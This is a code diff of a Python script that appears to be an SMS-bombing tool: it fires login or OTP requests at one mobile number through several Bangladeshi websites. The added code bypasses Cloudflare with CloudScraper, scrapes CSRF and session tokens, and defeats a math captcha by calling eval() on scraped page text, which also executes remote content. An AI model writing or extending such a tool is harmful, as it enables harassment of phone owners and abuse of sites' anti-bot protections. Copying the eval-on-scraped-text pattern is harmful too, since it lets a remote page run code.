@@ -1,26 +1,46 @@
 from json import dumps, loads, load
-from requests import get, post
+# from requests import get, post
+from cloudscraper import CloudScraper
 from random import choices
+from bs4 import BeautifulSoup
 from tldextract import extract
 from string import ascii_letters
 from threading import Thread
 from re import findall
 import urllib3
 
+get, post = lambda *a, **b: CloudScraper().get(*a, **b), lambda *c, **d: CloudScraper().post(*c, **d)
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 def send_dakterbhai(mobile):
-    resp=get('https://daktarbhai.com/')
-    cookies=''
-    headers={"Content-Type": "application/x-www-form-urlencoded"}
-    for key, value in resp.cookies.items():
-        cookies+=f'{key}={value}; '
-    csrf_token=findall('name="csrf-token" content="(.*?)"', resp.text)[0]
-    headers['X-CSRF-TOKEN'] = csrf_token
-    headers['Cookie'] = cookies
-    resp = post("https://daktarbhai.com/login/mobile", headers=headers, data="mobile=0"+str(mobile))
-    if resp.status_code==200 and resp.text=='': return True
-    else: return False
+	resp=get('https://daktarbhai.com/')
+	cookies=''
+	headers={"Content-Type": "application/x-www-form-urlencoded"}
+	for key, value in resp.cookies.items():
+		cookies+=f'{key}={value}; '
+	csrf_token=findall('name="csrf-token" content="(.*?)"', resp.text)[0]
+	headers['X-CSRF-TOKEN'] = csrf_token
+	headers['Cookie'] = cookies
+	resp = post("https://daktarbhai.com/login/mobile", headers=headers, data="mobile=0"+str(mobile))
+	if resp.status_code==200 and resp.text=='': return True
+	else: return False
+
+def get_onlineshop_bypass():
+	r=get('https://onlineshop.com.bd/login')
+	s=BeautifulSoup(r.text, 'html.parser')
+	e=s.select_one('.fr_calculatdiv table tr td h4')
+	j=eval(e.text.replace('=','').strip())
+	sid=r.cookies.get('PHPSESSID')
+	return sid, j
+
+def get_poshra_bypass():
+    r = get('https://poshorabd.com')
+    XSRF = r.cookies.get('XSRF-TOKEN')
+    SID = r.cookies.get('poshora_session')
+    s = BeautifulSoup(r.text, 'html.parser')
+    e = s.select_one('meta[name="csrf-token"]')
+    CSRF = e.get('content')
+    return XSRF, SID, CSRF
 
 def debug_write(domain, identifier, text, preback):
 	debug=open('debug.json', 'r')
@@ -35,7 +55,11 @@ def get_random(length=10):
 	return "".join(choices(ascii_letters, k=length))
 
 def get_domain(url):
-	return ".".join(list(extract(url)))
+	e = extract(url)
+	if e.subdomain:
+		return f'{e.subdomain}.{e.domain}.{e.suffix}'
+	else:
+		return f'{e.domain}.{e.suffix}'
 
 def send_request(info:dict, mobile:int=None):
 	url=info["url"]
@@ -57,7 +81,7 @@ def send_request(info:dict, mobile:int=None):
 		print("Method Error:", get_domain(url))
 		engine=post
 	try:
-		resp=engine(url, data=data, headers=headers, verify=False)
+		resp=engine(url, data=data, headers=headers, timeout=20)
 	except KeyboardInterrupt:
 		exit()
 	except:
@@ -80,7 +104,7 @@ def send_request(info:dict, mobile:int=None):
 				print("Method Error:", get_domain(url))
 				engine=post
 			try:
-				resp=engine(url, data=data, headers=headers, verify=False)
+				resp=engine(url, data=data, headers=headers, timeout=20)
 			except KeyboardInterrupt:
 				exit()
 			except:
@@ -109,6 +133,15 @@ def prepare_api(api, mobile):
 	api=dumps(api)
 	api=api.replace("{MOBILE_NO}", mobile)
 	api=api.replace("{RANDOM}", get_random())
+	
+	if api.__contains__('{ONLINE_SHOP_SUM}') and api.__contains__('{ONLINE_SHOP_SID}'):
+		sid, captcha_sum = get_onlineshop_bypass()
+		api=api.replace('{ONLINE_SHOP_SUM}', str(captcha_sum)).replace('{ONLINE_SHOP_SID}', sid)
+	
+	if api.__contains__('{POSHRA_CSRF}') and api.__contains__('{POSHRA_XSRF}') and api.__contains__('{POSHRA_SID}'):
+		XSRF, SID, CSRF = get_poshra_bypass()
+		api=api.replace('{POSHRA_XSRF}',XSRF).replace('{POSHRA_SID}', SID).replace('{POSHRA_CSRF}', CSRF)
+
 	api=loads(api)
 	return api
 
